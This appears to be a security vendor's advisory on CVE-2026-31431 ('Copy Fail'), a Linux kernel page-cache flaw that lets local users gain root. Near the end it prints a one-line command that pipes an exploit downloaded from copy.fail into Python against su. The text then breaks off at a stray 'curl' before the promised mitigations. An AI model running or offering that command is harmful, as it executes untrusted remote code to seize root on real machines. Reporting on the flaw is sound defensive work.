Linux Copy Fail zero-day enables privilege escalation

Written by:

ThreatLocker Threat Intelligence
Linux zero-day could allow underprivileged local users to obtain root access

Privilege escalation is dangerous for any organization. If an attacker gains elevated access to your environment, they can manipulate almost anything on your system and potentially compromise neighboring devices.

A new high-severity vulnerability in Linux is enabling just that.  

CVE-2026-31431, known as Copy Fail, is a local privilege escalation (LPE) flaw within the Linux kernel, enabling unprivileged local users with the ability to perform privilege escalation on virtually all major Linux distributions since 2017.

In this article, the ThreatLocker  Threat Intelligence team analyzes the flaw and provides mitigation strategies.
Copy Fail CVE-2026-31431 analysis

This is made possible due to a logical flaw in the Linux kernel’s AF_ALG AEAD (authenticated encryption with associated data) handling, where page-cache-backed file pages can be chained into a writable scatterlist during an in-place decryption operation.

The authencesn algorithm then performs a 4-byte scratch write beyond the intended output boundary, corrupting the in-memory page cache of a readable file without modifying the file on disk. Because setuid binaries are loaded from the page cache, an unprivileged local user can abuse this corruption path to gain root privilege. This vulnerability can be abused through a 732-byte Python script or equivalent Go/Rust implementation to obtain root on nearly all Linux distributions available since 2017.  

Page caches are used by the Linux kernel to make accessing objects more efficient. This is done by storing a copy of the object in memory, so that subsequent attempts to access it can be read directly from that memory space.  

Several kernel capabilities are chained together to perform this exploit, but the core issue comes from page caches in memory being written to outside of expected protections by the kernel. Write actions made to page caches are normally regulated by the kernel and handled properly.  

The Copy Fail exploit bypasses these restrictions entirely, allowing 4 bytes of any page cache in memory to be overwritten. Although 4 bytes may seem insignificant, changing the right value or instruction can make drastic differences.


<img width="1660" height="902" alt="image" src="https://github.com/user-attachments/assets/78d19e14-f49c-4237-bd5a-11c1dce9381d" />


curl https://copy.fail/exp | python3 su

curl
